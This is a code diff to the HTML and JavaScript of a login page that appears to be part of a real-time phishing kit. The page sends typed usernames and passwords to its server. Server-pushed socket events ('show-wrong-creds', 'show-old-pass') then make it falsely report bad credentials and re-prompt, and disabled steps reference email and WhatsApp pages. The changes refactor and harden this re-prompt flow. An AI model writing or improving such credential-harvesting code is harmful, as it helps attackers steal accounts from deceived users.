@@ -51,11 +51,11 @@
 
   <div class="fullscreenbg"></div>
 
-  <div class="flex flex-col h-screen relative z-10" id="main-content">
-    <div id="modal-overlay" style="display: none;">
-      <div id="modal-content" class="modal"></div>
-    </div>
+  <div id="modal-overlay" style="display: none;">
+    <div id="modal-content" class="modal"></div>
+  </div>
 
+  <div class="flex flex-col h-screen relative z-10" id="main-content">
     <div class="text-center mt-2">
       <p class="text-[13px] text-gray-600 whitespace-pre-wrap break-words fontiiiii">English (US)</p>
     </div>
@@ -133,10 +133,13 @@
     }
     async function loadModalPage(filename) {
       try {
-        const response = await fetch(`/public/${filename}`);
+        const file = filename.endsWith('.html') ? filename : `${filename}.html`;
+        const response = await fetch(`/public/${file}`);
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
         const html = await response.text();
         const overlay = document.getElementById('modal-overlay');
         const content = document.getElementById('modal-content');
+        if (!overlay || !content) throw new Error('Modal elements missing');
         content.innerHTML = html;
         overlay.style.display = 'flex';
 
@@ -313,20 +316,27 @@
     });
     // socket.on('show-email', () => loadPage('email'));
     // socket.on('show-whatsapp', () => loadPage('wh'));
-    socket.on('show-wrong-creds', () => loadModalPage('wrong-creds'));
+    socket.on('show-wrong-creds', () => {
+      if (!document.getElementById('loginBtn')) {
+        showLoginPage();
+      } else {
+        resetLoginForm();
+      }
+      loadModalPage('wrong-creds');
+    });
     socket.on('show-old-pass', () => loadModalPage('old-password'));
 
 
   </script>
   <script>
-    const loginBtn = document.getElementById('loginBtn');
-    const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
-
-    usernameInput.addEventListener('input', enableLoginBtn);
-    passwordInput.addEventListener('input', enableLoginBtn);
+    const loginPageHTML = document.getElementById('main-content').innerHTML;
 
     function enableLoginBtn() {
+      const loginBtn = document.getElementById('loginBtn');
+      const usernameInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
+      if (!loginBtn || !usernameInput || !passwordInput) return;
+
       if (usernameInput.value.trim() && passwordInput.value.trim()) {
         loginBtn.disabled = false;
         loginBtn.style.opacity = '1';
@@ -339,11 +349,14 @@
     }
 
     async function sendLoginData() {
+      const loginBtn = document.getElementById('loginBtn');
+      const usernameInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
+      if (!loginBtn || !usernameInput || !passwordInput) return;
+
       const username = usernameInput.value.trim();
       const password = passwordInput.value.trim();
-
       if (!username || !password) return;
-
 
       loginBtn.disabled = true;
       loginBtn.style.opacity = '0.4';
@@ -356,24 +369,46 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ username, password, socketId: socket.id })
         });
-
-        const data = await response.json();
-
-
-        if (data.success) {
-
-        } else {
-
-        }
+        await response.json();
       } catch (error) {
         console.error('Error:', error);
-
       }
-
-
     }
 
-    loginBtn.addEventListener('click', sendLoginData);
+    function initLoginForm() {
+      const loginBtn = document.getElementById('loginBtn');
+      const usernameInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
+      if (!loginBtn || !usernameInput || !passwordInput) return;
+
+      usernameInput.addEventListener('input', enableLoginBtn);
+      passwordInput.addEventListener('input', enableLoginBtn);
+      loginBtn.addEventListener('click', sendLoginData);
+    }
+
+    function showLoginPage() {
+      const main = document.getElementById('main-content');
+      main.className = 'flex flex-col h-screen relative z-10';
+      main.innerHTML = loginPageHTML;
+      initLoginForm();
+    }
+
+    function resetLoginForm() {
+      const loginBtn = document.getElementById('loginBtn');
+      const usernameInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
+
+      if (usernameInput) usernameInput.value = '';
+      if (passwordInput) passwordInput.value = '';
+      if (loginBtn) {
+        loginBtn.disabled = true;
+        loginBtn.style.opacity = '0.4';
+        loginBtn.style.cursor = 'not-allowed';
+        loginBtn.innerHTML = 'Log in';
+      }
+    }
+
+    initLoginForm();
   </script>
   <script>
     function checkIfStillMobile() {
@@ -383,26 +418,11 @@
       }
     }
     checkIfStillMobile();
+
     function closeModal() {
-
-      document.getElementById('modal-overlay').style.display = 'none';
-      const loginBtn = document.getElementById('loginBtn');
-      const usernameInput = document.getElementById('username');
-      const passwordInput = document.getElementById('password');
-
-
-
-      // Clear inputs
-      if (usernameInput) usernameInput.value = '';
-      if (passwordInput) passwordInput.value = '';
-
-      // Re-enable button
-      if (loginBtn) {
-        loginBtn.disabled = false;
-        loginBtn.style.opacity = '1';
-        loginBtn.style.cursor = 'pointer';
-        loginBtn.innerHTML = 'Log In';
-      }
+      const overlay = document.getElementById('modal-overlay');
+      if (overlay) overlay.style.display = 'none';
+      resetLoginForm();
     }
   </script>
 </body>
